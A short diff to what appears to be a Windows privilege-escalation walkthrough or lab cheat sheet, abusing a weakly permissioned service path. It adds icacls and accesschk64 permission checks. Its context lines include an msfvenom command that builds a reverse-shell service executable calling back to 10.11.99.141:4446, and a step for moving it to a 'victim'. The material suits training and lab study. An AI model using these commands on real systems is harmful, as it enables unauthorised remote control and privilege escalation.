@@ -216,7 +216,8 @@ sc.exe start windowsscheduler # powershell
 sc qc WindowsScheduler # cmd
 sc.exe qc WindowsScheduler # powershell
 2️⃣ # Checking access level on vulnerable path
-icacls C:\MyPrograms
+icacls "C:\MyPrograms"
+accesschk64.exe /accepteula -uwdq "C:\MyPrograms" 
 3️⃣ # Making a malicious Payload with MSFvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4446 -f exe-service -o rev-svc2.exe
 4️⃣ # Transfer of malicious file to the victim system
